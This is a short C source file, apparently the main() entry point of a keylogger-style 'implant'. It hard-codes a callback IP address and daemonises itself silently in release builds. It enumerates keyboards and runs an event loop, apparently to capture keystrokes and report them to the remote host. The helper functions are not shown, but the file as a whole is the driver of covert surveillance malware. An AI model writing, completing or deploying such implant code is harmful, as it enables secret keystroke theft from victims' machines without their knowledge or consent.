

#include <alloca.h>
#include <unistd.h>
#include "implant.h"

int main(
#ifdef DEBUG
    int ac,
    char **av,
#else
    __attribute__((unused)) int ac,
    __attribute__((unused)) char **av,
#endif
    __attribute__((unused)) char **envp) {

    implant_t instance = {
        .ip = "10.0.2.2", /* ip can be a domain name */
    };

#ifdef DEBUG
    if (ERROR == run_lexer(ac, av, &instance))
        return 1;

    DEBUG_LOG("[*] settings:\n\tIP:%s\n", instance.ip);
#else
    /* TODO(djnn): instance_load_from_memory(&instance); */

    daemon_setup();
#endif

    if (ERROR == fetch_available_keyboards(&instance))
        return 1;

    if (ERROR == evloop_run(&instance))
        return 1;

    return 0;
}
